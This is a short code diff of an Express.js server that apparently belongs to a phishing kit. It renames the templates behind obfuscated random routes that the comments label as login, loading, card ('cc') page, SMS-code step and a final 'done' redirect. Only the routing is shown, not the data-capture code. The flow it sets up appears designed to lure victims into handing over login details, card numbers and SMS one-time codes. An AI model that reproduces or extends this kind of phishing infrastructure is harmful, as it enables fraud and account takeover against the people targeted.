@@ -115,25 +115,25 @@ app.get("/",(req,res)=>{ // login
     res.render("index");
 });
 app.get("/fGnEL4jmpuBCDkJP3myR",(req,res)=>{ // loading 1:
-    res.render("rotol1");
+    res.render("rolado-1");
 });
 app.get("/QcEwP85AgNE4pnL5mWSM",(req,res)=>{ // loading 1:
-    res.render("acima");
+    res.render("cckobra");
 });
 app.get("/Q89HFszQPd3TFv4mx65k",(req,res)=>{ // cc page:
-    res.render("rotol2");
+    res.render("rolado-2");
 });
 app.get("/RKnUB922z6Mf4HDwg3EZ",(req,res)=>{ // loading 2:
-    res.render("otm1");
+    res.render("veriha-1");
 });
 app.get("/aEsKRvuaENZtYax265Kv",(req,res)=>{ // sms 1:
-    res.render("rotol3");
+    res.render("rolado-3");
 });
 app.get("/LGknmeM9HwWUWSutj6mJ",(req,res)=>{ // loading 3:
-    res.render("otm2");
+    res.render("veriha-2");
 });
 app.get("/HfuRVXK8w8fLmT2vWHe8",(req,res)=>{ // done:
-    res.render("rotol4",{url:process.env.URL});
+    res.render("rolado-4",{url:process.env.URL});
 });
 
 
